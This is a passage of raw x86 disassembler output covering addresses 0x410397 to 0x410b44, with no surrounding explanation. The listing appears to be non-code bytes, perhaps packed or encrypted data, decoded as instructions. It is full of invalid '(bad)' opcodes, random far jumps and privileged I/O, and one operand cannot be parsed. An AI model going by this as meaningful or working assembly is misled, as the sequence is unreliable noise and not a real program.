  410397:	sahf   
  410398:	push   ss
  410399:	mov    DWORD PTR [ebx],edi
  41039b:	xor    al,0x4e
  41039d:	retf   
  41039e:	inc    DWORD PTR [edx+0x51]
  4103a1:	les    ecx,FWORD PTR [edx+0x72]
  4103a4:	(bad)  
  4103a5:	xor    ebx,edi
  4103a7:	dec    edi
  4103a8:	scas   eax,DWORD PTR es:[edi]
  4103a9:	imul   BYTE PTR ds:0x85e28e20
  4103af:	out    dx,eax
  4103b0:	jo     0x41033a
  4103b2:	lods   eax,DWORD PTR ds:[esi]
  4103b3:	pop    ecx
  4103b4:	cdq    
  4103b5:	shl    DWORD PTR [ebp-0x52eee12c],cl
  4103bb:	xchg   ecx,eax
  4103bc:	icebp  
  4103bd:	out    0x2b,al
  4103bf:	fisttp DWORD PTR [edx]
  4103c1:	jecxz  0x410388
  4103c3:	inc    esi
  4103c4:	xchg   ecx,eax
  4103c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4103c6:	shl    DWORD PTR [eax],1
  4103c8:	jne    0x410391
  4103ca:	rcr    BYTE PTR [ebx],1
  4103cc:	mov    ebp,0xe38c41e2
  4103d1:	mov    esp,0x5a6a1a02
  4103d6:	inc    edi
  4103d7:	mov    ebp,ds
  4103d9:	sti    
  4103da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4103db:	test   ebp,edx
  4103dd:	pop    ds
  4103de:	push   0x21
  4103e0:	ins    DWORD PTR es:[edi],dx
  4103e1:	ss jmp 0xbee9:0xbabfc4d9
  4103e9:	xor    al,0xb0
  4103eb:	sbb    edx,esp
  4103ed:	shl    eax,1
  4103ef:	xor    dh,al
  4103f1:	aad    0x6c
  4103f3:	jb     0x410457
  4103f5:	cmp    eax,esi
  4103f7:	inc    ebp
  4103f8:	add    ebp,esp
  4103fa:	aas    
  4103fb:	imul   edi,ebp,0x5c
  4103fe:	rol    ebx,cl
  410400:	pop    ss
  410401:	int3   
  410402:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410403:	outs   dx,DWORD PTR ds:[esi]
  410404:	mov    al,ds:0x906238d
  41040a:	fwait
  41040b:	mov    eax,ds:0x60ed8d28
  410410:	sub    eax,0xece0a083
  410415:	pusha  
  410416:	lods   eax,DWORD PTR ds:[esi]
  410417:	push   esp
  410418:	loope  0x410472
  41041a:	test   DWORD PTR ds:[esi-0x5d],ecx
  41041e:	mov    edi,0x49fbdf6d
  410423:	and    esi,DWORD PTR [ebx-0x4fc091cc]
  410429:	jae    0x41041f
  41042b:	ds int 0xb5
  41042e:	or     esi,DWORD PTR [edx]
  410430:	fmul   st,st(2)
  410433:	fwait
  410434:	(bad)  
  410435:	or     BYTE PTR [edx-0x3bb4b426],0xa0
  41043c:	test   BYTE PTR [esi-0x3],0x99
  410440:	and    eax,0x60f6cef7
  410445:	xchg   ebx,eax
  410446:	push   edx
  410447:	aam    0xdc
  410449:	push   ss
  41044a:	(bad)  
  41044b:	xlat   BYTE PTR ds:[ebx]
  41044c:	inc    edx
  41044d:	jo     0x41044b
  41044f:	rcr    edx,cl
  410451:	stos   DWORD PTR es:[edi],eax
  410452:	pop    es
  410453:	adc    DWORD PTR [eax],edi
  410455:	cmp    BYTE PTR [ebx+0x76],bl
  410458:	repnz rcr BYTE PTR [ebx+0x4f],0xa9
  41045d:	add    dh,BYTE PTR [ebx]
  41045f:	xchg   edi,eax
  410460:	pop    ebp
  410461:	mov    DWORD PTR [edx],eax
  410463:	or     dh,BYTE PTR [esi-0x3537faab]
  410469:	dec    esi
  41046a:	xor    al,0x26
  41046d:	shr    ebp,0x45
  410470:	je     0x410451
  410472:	(bad)  
  410473:	popa   
  410474:	out    0x99,eax
  410476:	push   ds
  410477:	xchg   esi,eax
  410478:	nop
  410479:	pop    ss
  41047a:	mov    bl,0x64
  41047c:	xchg   esp,eax
  41047d:	lods   al,BYTE PTR ds:[esi]
  41047e:	xchg   edx,eax
  41047f:	sub    ch,dh
  410481:	out    0x4e,eax
  410483:	iret   
  410484:	out    dx,al
  410485:	fs sti 
  410487:	cmovp  esp,ebp
  41048a:	xor    eax,DWORD PTR [edi-0x72cce400]
  410490:	test   DWORD PTR [ecx-0x4b],0x1ca67696
  410497:	push   esp
  410498:	out    0xfd,al
  41049a:	mov    DWORD PTR [ecx+eiz*4],edi
  41049d:	imul   ebx,ebx,0x5d
  4104a0:	or     DWORD PTR [ebx-0x75],edx
  4104a3:	(bad)  
  4104a5:	sahf   
  4104a6:	and    BYTE PTR [ebx-0x1d],bh
  4104a9:	or     al,0xe3
  4104ab:	xor    ecx,DWORD PTR [ecx+0x220c46b3]
  4104b1:	cmp    esp,esi
  4104b3:	in     eax,0x70
  4104b5:	add    al,0x51
  4104b7:	retf   0x966f
  4104ba:	test   al,0x57
  4104bc:	ficom  WORD PTR [edi+0x22]
  4104bf:	ds mov ebp,0x91d9464c
  4104c5:	imul   BYTE PTR [esi-0x16]
  4104c8:	dec    ebx
  4104c9:	and    ebp,DWORD PTR [edi-0x55ad322a]
  4104cf:	jae    0x410519
  4104d1:	mov    esp,0x6803df39
  4104d6:	pop    ebx
  4104d8:	out    0xc,al
  4104da:	adc    DWORD PTR [esi+0x11960725],0xd9b48254
  4104e4:	push   ss
  4104e5:	hlt    
  4104e6:	mov    esi,0xba0ceb79
  4104eb:	or     edx,ecx
  4104ed:	add    BYTE PTR [ebx+0x75],bh
  4104f0:	cmp    ch,BYTE PTR [edi*1-0x6eb17a29]
  4104f7:	fisub  WORD PTR [ecx]
  4104f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4104fa:	ret    0x1529
  4104fd:	mov    bl,0xae
  4104ff:	es sbb DWORD PTR fs:[esi-0x45],0xffffffa0
  410505:	pop    esi
  410506:	sub    ah,BYTE PTR [esi+0x631bcd54]
  41050c:	jecxz  0x4104bd
  41050e:	mov    dl,0x4b
  410510:	inc    ecx
  410511:	jmp    0x8e97:0x1ced2637
  410518:	jle    0x41051f
  41051a:	adc    DWORD PTR [ecx],ebp
  41051c:	xor    al,0xda
  41051e:	clc    
  41051f:	inc    eax
  410520:	adc    DWORD PTR [ebx],0xa6ea5e5c
  410526:	scas   eax,DWORD PTR es:[edi]
  410527:	xchg   edi,edx
  410529:	push   cs
  41052a:	(bad)  
  41052b:	mov    WORD PTR ds:0x7ef099af,ss
  410531:	push   edx
  410532:	std    
  410533:	lea    eax,[ecx+0x4bbce0a1]
  410539:	adc    eax,0x2aa78416
  41053e:	jno    0x4104c7
  410540:	aam    0x34
  410542:	fdivr  DWORD PTR [ecx]
  410544:	loop   0x41052d
  410546:	mov    dh,0x4b
  410548:	jb     0x410534
  41054a:	or     eax,0x8f3f04c6
  41054f:	cmp    dh,bl
  410551:	stc    
  410552:	jmp    0x410515
  410554:	into   
  410555:	adc    bl,BYTE PTR [ebp+0x438015fa]
  41055b:	dec    esp
  41055c:	dec    ebp
  41055d:	cli    
  41055e:	(bad)  
  410560:	push   ss
  410561:	(bad)  
  410562:	pop    esi
  410563:	dec    edx
  410564:	xor    edi,DWORD PTR [edx+0x5]
  410567:	push   edx
  410568:	ficomp DWORD PTR [edx+0x65cedc42]
  41056e:	into   
  41056f:	(bad)  
  410570:	or     DWORD PTR [eax-0xb3a03e9],esp
  410576:	xchg   esi,eax
  410577:	mov    dl,0x55
  410579:	out    0xf9,eax
  41057b:	and    al,0x3a
  41057d:	in     al,0x40
  41057f:	in     al,dx
  410580:	sub    DWORD PTR [esi-0x73198185],0xffffffe1
  410587:	popa   
  410588:	ret    
  410589:	(bad)  
  41058a:	fwait
  41058b:	cs dec esi
  41058d:	jp     0x41052b
  41058f:	add    al,0xc
  410591:	lahf   
  410592:	add    esi,DWORD PTR [edx+esi*4+0x1b]
  410596:	add    edx,DWORD PTR [edx-0xf]
  410599:	inc    ebp
  41059a:	mov    ch,0xae
  41059c:	bound  edx,QWORD PTR [esi-0x34f40bb0]
  4105a2:	(bad)  
  4105a4:	xchg   esi,eax
  4105a5:	or     BYTE PTR [esi],0xa2
  4105a8:	shr    DWORD PTR ds:0xec9307cf,0x4c
  4105af:	xchg   bh,dl
  4105b1:	test   DWORD PTR [ebx+0x34],0x34d57e65
  4105b8:	xor    eax,0x3f0a773c
  4105bd:	sub    ebp,esp
  4105bf:	xor    dh,dl
  4105c1:	jmp    0xc830:0x276e4957
  4105c8:	jecxz  0x4105f9
  4105ca:	mov    al,ds:0x99e7df41
  4105cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4105d0:	jp     0x410607
  4105d2:	sti    
  4105d3:	gs retf 
  4105d5:	jecxz  0x410616
  4105d7:	fsub   st(1),st
  4105d9:	xchg   esi,eax
  4105da:	push   eax
  4105db:	mov    edx,eax
  4105dd:	sub    ch,BYTE PTR [esi]
  4105df:	mov    dh,0xd6
  4105e1:	mov    ebp,0x90c3c079
  4105e6:	pmaddwd mm1,QWORD PTR ds:0x76fe2989
  4105ed:	mov    esi,0x26d319a3
  4105f2:	sub    eax,DWORD PTR [ecx+0x5a]
  4105f5:	jnp    0x410620
  4105f7:	sbb    al,0xb
  4105f9:	mov    al,0xb4
  4105fb:	xchg   esp,eax
  4105fc:	cdq    
  4105fd:	fisub  DWORD PTR [ecx-0x67]
  410600:	call   0xdae6:0xf6a3357c
  410607:	push   cs
  410608:	sar    al,1
  41060a:	jl     0x4105b3
  41060c:	add    bl,BYTE PTR [esi+ebx*1-0x34]
  410610:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410611:	mov    dl,0x53
  410613:	pop    es
  410614:	repz inc esi
  410616:	cmp    BYTE PTR [eax-0x26],0xbe
  41061a:	cli    
  41061b:	xlat   BYTE PTR ds:[ebx]
  41061c:	das    
  41061d:	pop    edx
  41061e:	out    dx,eax
  41061f:	jae    0x410600
  410621:	jne    0x410691
  410623:	hlt    
  410624:	push   edi
  410625:	in     al,0xdd
  410627:	js     0x41068a
  410629:	xchg   esp,eax
  41062a:	ret    
  41062b:	jno    0x4105c7
  41062d:	dec    ebx
  41062e:	fwait
  41062f:	int3   
  410630:	pop    edi
  410631:	or     cl,BYTE PTR [edi+edx*1+0x35f162af]
  410638:	in     eax,dx
  410639:	packsswb mm4,QWORD PTR [esi+0x41aa293d]
  410640:	(bad)  
  410641:	fdivr  DWORD PTR [edx+eax*2-0x7debc37]
  410648:	lahf   
  410649:	dec    ebx
  41064a:	mov    cl,0x79
  41064c:	scas   al,BYTE PTR es:[edi]
  41064d:	xor    al,0x59
  41064f:	in     al,0x11
  410651:	sahf   
  410652:	shl    BYTE PTR [esi+0x7520b4a5],cl
  410658:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410659:	stos   DWORD PTR es:[edi],eax
  41065a:	aad    0x86
  41065c:	xchg   DWORD PTR [eax+0x4f],ebp
  41065f:	inc    eax
  410660:	int    0xc2
  410662:	(bad)  
  410664:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410665:	xchg   esp,eax
  410666:	inc    esi
  410667:	stc    
  410668:	retf   
  410669:	lock aas 
  41066b:	mov    ah,0x78
  41066d:	cmp    ebx,esi
  41066f:	bound  ebx,QWORD PTR [ebx-0x634a2f25]
  410675:	sbb    bh,BYTE PTR [eax-0x576a078d]
  41067b:	pop    ss
  41067c:	std    
  41067d:	int    0xb5
  41067f:	cld    
  410680:	out    0xb1,al
  410682:	jecxz  0x41063d
  410684:	jno    0x410658
  410686:	sbb    eax,0x6a8e1f08
  41068b:	sahf   
  41068c:	xor    ebp,DWORD PTR [ecx]
  41068e:	enter  0x808a,0xde
  410692:	and    dh,BYTE PTR [edi+eax*1]
  410695:	hlt    
  410696:	hlt    
  410697:	xor    al,0x68
  410699:	cli    
  41069a:	js     0x410707
  41069c:	jns    0x4106f7
  41069e:	mov    al,ds:0x7e65096f
  4106a3:	jecxz  0x410672
  4106a5:	mov    ah,0xb8
  4106a7:	push   cs
  4106a8:	push   ecx
  4106a9:	adc    eax,0xe213fa73
  4106ae:	sbb    DWORD PTR [ebp+0x6854cc39],esi
  4106b4:	js     0x410656
  4106b6:	jno    0x4106fd
  4106b8:	jae    0x410654
  4106ba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4106bb:	cmovno ecx,DWORD PTR [ebp+edi*1-0x699640fa]
  4106c3:	loopne 0x4106fa
  4106c5:	retf   
  4106c6:	fs xchg edx,eax
  4106c8:	add    DWORD PTR [edi+0x6f],edi
  4106cb:	scas   eax,DWORD PTR es:[edi]
  4106cc:	vmovaps YMMWORD PTR [ecx],ymm7
  4106d0:	push   es
  4106d1:	popa   
  4106d2:	cmp    al,0x7c
  4106d4:	pop    esi
  4106d5:	cmp    eax,0x8494cd77
  4106da:	inc    ebx
  4106db:	mov    bh,0x4b
  4106dd:	push   esi
  4106de:	das    
  4106df:	and    BYTE PTR [ebp-0x787195be],cl
  4106e5:	jmp    0xd44b74b4
  4106ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4106eb:	mov    bl,al
  4106ed:	adc    al,0x91
  4106ef:	sub    esi,eax
  4106f1:	adc    eax,DWORD PTR [ebx-0x22]
  4106f4:	dec    ebx
  4106f5:	mov    ebx,0x5640a886
  4106fa:	sub    ebx,DWORD PTR [ebx+0x9]
  4106fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4106fe:	adc    DWORD PTR [edi-0x4e],edi
  410701:	iret   
  410702:	add    bl,BYTE PTR [esi]
  410704:	cmp    DWORD PTR [ebp+0x44],0xffffff9f
  410708:	stc    
  410709:	in     eax,dx
  41070a:	pop    es
  41070b:	push   ss
  41070c:	sbb    DWORD PTR [edi+0x3e],esp
  41070f:	or     BYTE PTR [eax+0x65],ch
  410712:	cmp    dl,BYTE PTR [ecx]
  410714:	jbe    0x41078a
  410716:	test   DWORD PTR [edx],0x963bf385
  41071c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41071d:	inc    edx
  41071e:	xchg   ebx,eax
  41071f:	xchg   esi,edx
  410721:	addr16 pop ecx
  410723:	fsubr  QWORD PTR [ebx]
  410725:	mov    esp,0x7a42ab70
  41072a:	adc    al,0x84
  41072c:	divps  xmm0,XMMWORD PTR [ebp-0x5042b54e]
  410733:	sub    eax,0x30e8d173
  410738:	cli    
  410739:	mov    ecx,0xf517d9fd
  41073e:	gs push ebp
  410740:	or     BYTE PTR [edx-0x64d88ed7],dh
  410746:	mov    edx,0x9526ae02
  41074b:	push   ecx
  41074c:	test   al,0x3d
  41074e:	imul   esp,eax,0xecd92cfc
  410754:	and    cl,BYTE PTR [ecx]
  410756:	cmc    
  410757:	sbb    edx,DWORD PTR [ecx]
  410759:	cmp    ch,dh
  41075b:	ret    0x7fa8
  41075e:	les    edi,FWORD PTR [ebp-0x32d76b1]
  410764:	mov    ebx,DWORD PTR [ebx+eiz*2+0x38]
  410768:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410769:	adc    dl,dl
  41076b:	xchg   dl,bl
  41076d:	out    0x82,eax
  41076f:	xor    dl,cl
  410771:	rol    DWORD PTR [ebp-0x2d62cb23],cl
  410777:	gs call 0xb6d0d5ec
  41077d:	or     al,0x79
  41077f:	ds sbb al,bh
  410782:	mov    edx,0xef36d603
  410787:	and    dh,BYTE PTR [edx-0xb979961]
  41078d:	mov    dl,0xe1
  41078f:	je     0x4107a0
  410791:	cmp    ch,bh
  410793:	out    dx,eax
  410794:	pop    ds
  410795:	xor    BYTE PTR [edi-0x518dd97c],dl
  41079b:	or     DWORD PTR [ebp-0x6dc400e5],eax
  4107a1:	mov    bh,0x4c
  4107a3:	int3   
  4107a4:	and    eax,0x143cf046
  4107a9:	push   esi
  4107aa:	and    edi,DWORD PTR [ebp-0x71be1564]
  4107b0:	stos   DWORD PTR es:[edi],eax
  4107b1:	inc    esp
  4107b2:	rcl    BYTE PTR [ebx-0x58],1
  4107b5:	(bad)  
  4107b6:	inc    DWORD PTR [ecx]
  4107b8:	idiv   BYTE PTR [ecx+0x4203934b]
  4107be:	jbe    0x410785
  4107c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4107c1:	pop    esp
  4107c2:	push   esi
  4107c3:	test   DWORD PTR [eax],edi
  4107c5:	(bad)  
  4107c6:	fwait
  4107c7:	icebp  
  4107c8:	inc    esi
  4107c9:	cmp    BYTE PTR [edx],bh
  4107cb:	push   eax
  4107cc:	mov    bl,0x34
  4107ce:	or     DWORD PTR [edi],ecx
  4107d0:	push   ss
  4107d1:	pop    ebp
  4107d2:	rol    ch,cl
  4107d4:	xchg   ebx,eax
  4107d5:	out    0x63,al
  4107d7:	cs je  0x41084b
  4107da:	fdivr  st,st(1)
  4107dc:	xor    eax,0x51d491c5
  4107e1:	sub    DWORD PTR [esi+0x18],esp
  4107e4:	cmp    dl,BYTE PTR [edi+0x7b]
  4107e7:	pop    esi
  4107e8:	and    DWORD PTR [ecx+edx*4],0x3
  4107ec:	jbe    0x410827
  4107ee:	push   DWORD PTR [ebp+ebx*2-0x5f]
  4107f2:	sub    DWORD PTR [eax-0x39134339],ecx
  4107f8:	out    dx,eax
  4107f9:	push   ss
  4107fa:	jl     0x4107d2
  4107fc:	dec    edi
  4107fd:	xor    bh,BYTE PTR [ebx]
  4107ff:	dec    eax
  410800:	(bad)  
  410802:	add    ebx,ecx
  410804:	jo     0x4107cb
  410806:	jecxz  0x4107a4
  410808:	js     0x41084e
  41080a:	nop
  41080b:	xor    ebp,edx
  41080d:	in     eax,0x36
  41080f:	sbb    BYTE PTR [esi+0x22],0xbc
  410813:	popa   
  410814:	ins    DWORD PTR es:[edi],dx
  410815:	retf   0xc8de
  410818:	loope  0x410814
  41081a:	mov    bl,BYTE PTR [esi]
  41081c:	mov    ebx,0x48d9435a
  410821:	loope  0x4107f2
  410823:	cmp    BYTE PTR [edx+0x3a680772],0x2f
  41082a:	cmp    al,0xc7
  41082c:	push   cs
  41082d:	loope  0x410896
  41082f:	fdiv   QWORD PTR [ecx-0x1257bde0]
  410835:	loope  0x41080a
  410837:	cwde   
  410838:	sbb    eax,0xc60e5739
  41083d:	sbb    edi,DWORD PTR [ebp-0x9097814]
  410843:	dec    edi
  410844:	mov    al,0xc4
  410846:	les    eax,FWORD PTR [ecx]
  410848:	loop   0x410876
  41084a:	test   al,0x9a
  41084c:	adc    dh,BYTE PTR [edx]
  41084e:	inc    DWORD PTR [esi+eax*1+0x53]
  410852:	cmc    
  410853:	push   eax
  410854:	mov    eax,0x3d29382
  410859:	add    DWORD PTR ds:0x6d375b66,0x257229a1
  410863:	mov    al,0x90
  410865:	mov    ?,WORD PTR ds:0x2264e291
  41086b:	cmp    BYTE PTR [edi+0x51],dl
  41086e:	jge    0x41080d
  410870:	mul    DWORD PTR [edi]
  410872:	adc    edi,ecx
  410874:	or     ah,dh
  410876:	cli    
  410877:	push   edi
  410878:	stc    
  410879:	std    
  41087a:	stos   BYTE PTR es:[edi],al
  41087b:	loope  0x410887
  41087d:	mov    ebp,eax
  41087f:	mov    eax,ds:0xcbd6a1a0
  410884:	clc    
  410885:	shl    DWORD PTR [eax+0x654a7597],0xea
  41088c:	gs adc al,0x57
  41088f:	add    BYTE PTR [esi],ah
  410891:	add    dl,ah
  410893:	fwait
  410894:	lods   eax,DWORD PTR ds:[esi]
  410895:	inc    ebp
  410896:	jbe    0x41087a
  410898:	je     0x410909
  41089a:	inc    esi
  41089b:	cld    
  41089c:	pop    ecx
  41089d:	inc    esi
  41089e:	xchg   edx,eax
  41089f:	xchg   DWORD PTR [ecx-0x46],esp
  4108a2:	xchg   ecx,eax
  4108a3:	push   es
  4108a4:	ss dec ebx
  4108a6:	push   eax
  4108a7:	xor    BYTE PTR [edx+eiz*4+0x26],ah
  4108ab:	jg     0x4108f2
  4108ad:	push   eax
  4108ae:	shl    BYTE PTR [ecx-0x73],0xc0
  4108b2:	push   edx
  4108b3:	push   es
  4108b4:	or     eax,0x141da039
  4108b9:	push   ds
  4108ba:	adc    ecx,DWORD PTR [eax]
  4108bc:	test   BYTE PTR [ebx-0xe0bad2b],ah
  4108c2:	data16 jl 0x4108a2
  4108c5:	ret    0x54b8
  4108c8:	fiadd  WORD PTR [edx-0x11]
  4108cb:	sti    
  4108cc:	or     BYTE PTR [edx+0x7],bl
  4108cf:	aad    0x9e
  4108d1:	loope  0x4108b1
  4108d3:	movlps xmm2,QWORD PTR [ebx-0x6]
  4108d7:	stos   DWORD PTR es:[edi],eax
  4108d8:	aad    0xdf
  4108da:	mov    eax,ds:0xd1693f2e
  4108df:	pop    ds
  4108e0:	mov    esi,0x87f13a68
  4108e5:	in     eax,dx
  4108e6:	bound  esi,QWORD PTR [esi+0x665e36a9]
  4108ec:	push   ds
  4108ed:	punpcklwd mm6,DWORD PTR [edi+ecx*1+0x4de47e83]
  4108f5:	aad    0x4c
  4108f7:	jbe    0x41092e
  4108f9:	es inc eax
  4108fb:	data16 rcl BYTE PTR [eax],cl
  4108fe:	loopne 0x410920
  410900:	loopne 0x41095a
  410902:	or     DWORD PTR [edx-0x2507c0d0],esi
  410908:	xchg   ecx,eax
  410909:	inc    eax
  41090a:	les    esi,FWORD PTR [edi]
  41090c:	inc    bx
  41090e:	inc    edi
  41090f:	cmp    eax,0xac1c9d7c
  410914:	mov    WORD PTR [ebp-0x23],cs
  410917:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410918:	imul   eax,DWORD PTR [eax],0xd7c1ef78
  41091e:	xchg   ebx,eax
  41091f:	rcl    DWORD PTR [eax-0x6978c178],1
  410925:	dec    ebx
  410926:	or     al,0x98
  410928:	mul    al
  41092a:	lock dec edx
  41092c:	pop    ds
  41092d:	adc    ebx,DWORD PTR [eax]
  41092f:	test   DWORD PTR [eax+0x44981cec],0x6c0adda5
  410939:	sbb    DWORD PTR [esi*1+0x54192574],0xfd6dd47d
  410944:	mov    cl,BYTE PTR [eax-0x1bbdf910]
  41094a:	sbb    DWORD PTR [edi],0xffffffae
  41094d:	mov    WORD PTR [esi+0x4f],es
  410950:	inc    esi
  410951:	inc    eax
  410952:	add    eax,0x6d72ed5d
  410957:	jmp    0x57c639f9
  41095c:	xchg   dh,bh
  41095e:	cmp    esp,esi
  410960:	jbe    0x4108e7
  410962:	in     eax,0xce
  410964:	inc    edi
  410965:	jns    0x410906
  410967:	pop    esp
  410968:	jp     0x4109e2
  41096a:	and    DWORD PTR [esi+0x2c],ecx
  41096d:	stc    
  41096e:	xor    ah,BYTE PTR [eax]
  410970:	xchg   ebp,eax
  410971:	daa    
  410972:	les    ebp,FWORD PTR ds:0x54778a60
  410978:	jae    0x4109a1
  41097a:	sub    BYTE PTR [edi+0x70],al
  41097d:	mov    DWORD PTR [ebp+0x68b9bd20],0xa101437c
  410987:	cdq    
  410988:	dec    edx
  410989:	jp     0x410965
  41098b:	jmp    0x401d7669
  410990:	adc    al,0x2f
  410992:	mov    ebx,0x89602a6f
  410997:	cmp    ebx,DWORD PTR [edi-0x42c75e24]
  41099d:	and    al,0x64
  41099f:	das    
  4109a0:	or     eax,ebx
  4109a2:	jno    0x410968
  4109a4:	mov    edx,0x6acea7fe
  4109a9:	out    0xee,eax
  4109ab:	adc    BYTE PTR [ebx],cl
  4109ad:	retf   0x201d
  4109b0:	dec    ebx
  4109b1:	jne    0x410980
  4109b3:	xchg   DWORD PTR [eax-0x1c],ebp
  4109b6:	dec    edi
  4109b7:	fcomip st,st(1)
  4109b9:	(bad)  
  4109ba:	aad    0x76
  4109bc:	push   eax
  4109bd:	shr    BYTE PTR [edi-0x11],0x2a
  4109c1:	and    DWORD PTR [ebx+0x4d],esi
  4109c4:	xchg   ebp,eax
  4109c5:	inc    edx
  4109c6:	cmp    esp,DWORD PTR [esi-0x5e830d05]
  4109cc:	sar    DWORD PTR [ebp+0x762a50cd],1
  4109d2:	lahf   
  4109d3:	and    DWORD PTR [edx-0x1f],eax
  4109d6:	adc    ah,ch
  4109d8:	adc    bl,dh
  4109da:	repz call 0x40af:0x975c98f5
  4109e2:	xchg   esp,eax
  4109e3:	clc    
  4109e4:	test   al,0xd5
  4109e6:	call   0x2e5907e8
  4109eb:	mov    BYTE PTR [esi],0xfd
  4109ee:	push   edx
  4109ef:	cld    
  4109f0:	jle    0x4109b6
  4109f2:	lods   al,BYTE PTR ds:[esi]
  4109f3:	idiv   DWORD PTR [esi+0x5b]
  4109f6:	mov    cl,0x4d
  4109f8:	ret    
  4109f9:	test   al,0xac
  4109fb:	outs   dx,BYTE PTR ds:[esi]
  4109fc:	aaa    
  4109fd:	jae    0x410a47
  4109ff:	(bad)  
  410a00:	sbb    esp,ecx
  410a02:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410a03:	mov    ah,0x94
  410a05:	gs jae 0x4109d2
  410a08:	sahf   
  410a09:	adc    DWORD PTR [ebp-0x4c57ce3d],edx
  410a0f:	and    eax,0xcb47db4c
  410a14:	add    edi,DWORD PTR [ebp+0x24]
  410a17:	jnp    0x4109b5
  410a19:	mov    ebx,0x74f340e0
  410a1e:	lods   eax,DWORD PTR ds:[esi]
  410a1f:	cmp    BYTE PTR [esi+0x28],0x54
  410a23:	mov    ds:0xabcedd55,eax
  410a28:	lahf   
  410a29:	sbb    eax,0x58ee13cf
  410a2e:	loop   0x410a14
  410a30:	xchg   esi,eax
  410a31:	pop    esi
  410a32:	xchg   edx,eax
  410a33:	xchg   ecx,eax
  410a34:	aaa    
  410a35:	rcr    BYTE PTR [ebp-0x4f],cl
  410a38:	loopne 0x410a86
  410a3a:	(bad)  
  410a3b:	xor    cl,cl
  410a3d:	imul   ebx,edx,0xffffffbf
  410a40:	dec    ecx
  410a41:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410a42:	nop
  410a43:	pop    ebx
  410a44:	push   edi
  410a45:	out    0xc0,al
  410a47:	dec    esi
  410a48:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410a49:	inc    eax
  410a4a:	pop    esi
  410a4b:	sbb    DWORD PTR [edx+0xb],ebx
  410a4e:	inc    ecx
  410a4f:	push   ebp
  410a50:	les    edi,FWORD PTR [edi]
  410a52:	sub    DWORD PTR [edi-0x67b5eb22],edx
  410a58:	adc    BYTE PTR [ecx+0x57],al
  410a5b:	pop    edx
  410a5c:	call   0xe4f19c3c
  410a61:	popa   
  410a62:	lahf   
  410a63:	mov    ebx,0x458d8f44
  410a68:	(bad)  
  410a69:	and    ah,BYTE PTR [ecx+ebp*8-0x74]
  410a6d:	(bad)  
  410a6e:	inc    ebp
  410a6f:	cmp    eax,0x42c6292b
  410a74:	mov    eax,ds:0xb2be24d0
  410a79:	push   ds
  410a7a:	mov    BYTE PTR [edi-0x25c58d0f],al
  410a80:	call   0x1323bb5c
  410a85:	icebp  
  410a86:	xchg   esi,eax
  410a87:	cmp    edx,edx
  410a89:	out    0x31,al
  410a8b:	loop   0x410a96
  410a8d:	bound  edx,QWORD PTR [edi+eax*1+0x1a0b5112]
  410a94:	mov    ds:0xf8bf59a2,eax
  410a99:	loop   0x410a54
  410a9b:	jae    0x410ac4
  410a9d:	pop    es
  410a9e:	fwait
  410a9f:	add    DWORD PTR [ecx],esi
  410aa1:	and    al,BYTE PTR [edi-0x2]
  410aa4:	out    0x6f,eax
  410aa6:	sub    DWORD PTR [ebx],edi
  410aa8:	dec    ebx
  410aa9:	inc    edx
  410aaa:	cmp    bl,BYTE PTR [edx-0x56]
  410aad:	xchg   ebp,eax
  410aae:	jecxz  0x410b2d
  410ab0:	gs dec edx
  410ab2:	ds add eax,0x1b2463ee
  410ab8:	ja     0x410b21
  410aba:	xchg   ebx,eax
  410abb:	or     bh,BYTE PTR [esi+esi*1+0x23]
  410abf:	cmp    eax,0x37d9349a
  410ac4:	popa   
  410ac5:	or     al,0xb9
  410ac7:	fimul  WORD PTR [ecx*2-0x2dcf6ee]
  410ace:	outs   dx,DWORD PTR ds:[esi]
  410acf:	leave  
  410ad0:	aam    0xf
  410ad2:	push   esi
  410ad3:	in     al,dx
  410ad4:	in     eax,dx
  410ad5:	push   cs
  410ad6:	ss sbb eax,0x7d944b15
  410adc:	pop    DWORD PTR [edx+esi*2+0x7f315198]
  410ae3:	jmp    0x410ace
  410ae5:	inc    ebx
  410ae6:	in     eax,0x7a
  410ae8:	sbb    edi,DWORD PTR [edi+0xb]
  410aeb:	hlt    
  410aec:	xlat   BYTE PTR ds:[ebx]
  410aed:	jge    0x410b44
  410aef:	scas   eax,DWORD PTR es:[edi]
  410af0:	xchg   esp,eax
  410af1:	rol    cl,0x6f
  410af4:	xchg   ebx,eax
  410af5:	fisttp QWORD PTR ds:0x6dad24eb
  410afb:	jl     0x410acb
  410afd:	mov    DWORD PTR [esi],0x2ded45a0
  410b03:	cmp    DWORD PTR [ebx-0x7d1b2216],edi
  410b09:	call   ebp
  410b0b:	pop    ss
  410b0c:	dec    eax
  410b0d:	lock dec ebx
  410b0f:	mov    esp,DWORD PTR [ecx+0x68d956b7]
  410b15:	das    
  410b16:	push   ds
  410b17:	sbb    edx,ecx
  410b19:	mov    BYTE PTR [edx-0x44],dh
  410b1c:	je     0x410b4c
  410b1e:	pop    ds
  410b1f:	es inc esi
  410b21:	int3   
  410b22:	adc    BYTE PTR [ebp+0x7cdf24c],dl
  410b28:	sbb    edi,DWORD PTR [edx+0x51f5b5dc]
  410b2e:	int3   
  410b2f:	(bad)  
  410b30:	fwait
  410b31:	cmp    BYTE PTR [ebp+0x2],bh
  410b34:	mov    al,ds:0xab45800f
  410b39:	(bad)
  410b3c:	mov    edx,DWORD PTR [esi]
  410b3e:	jecxz  0x410b70
  410b40:	jb     0x410bc0
  410b42:	jae    0x410bc0
  410b44:	lds    ecx,FWORD PTR [edx]
